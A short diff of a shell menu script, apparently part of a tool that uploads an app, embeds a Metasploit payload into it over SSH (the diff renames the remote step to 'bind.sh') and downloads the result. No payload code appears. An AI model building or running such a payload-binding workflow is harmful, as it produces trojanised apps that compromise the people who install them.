@@ -2,7 +2,7 @@ source $HOME/T-Load/host
 source "$HOME/.msf_default/pay"
 dir=$HOME/T-Load
 clear
-echo "In Maintainance mode. Pleasr cooperate."
+echo "In Maintainance mode. Please cooperate."
 echo "1) Upload original app"
 echo "2) Embed"
 echo "3) Download embed app"
@@ -25,7 +25,7 @@ $dir/embed
 elif [ $embc = "2" ]
 then
 clear
-ssh -i $dir/key sathvik@$host -t "p1=$oapp p4=$fapp t.sh"
+ssh -i $dir/key sathvik@$host -t "p1=$oapp p4=$fapp bind.sh"
 sleep 3
 $dir/embed
 elif [ $embc = "3" ]
